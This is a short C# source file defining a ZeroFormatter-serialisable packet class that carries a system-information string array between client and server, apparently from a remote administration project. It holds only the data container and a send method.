using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetSysInfoResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetSysInfoResponse;
            }
        }

        [Index(0)]
        virtual public string[] infoCollection { get; set; }

        public GetSysInfoResponse()
        {
        }

        public GetSysInfoResponse(string[] infoCollection)
        {
            this.infoCollection = infoCollection;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
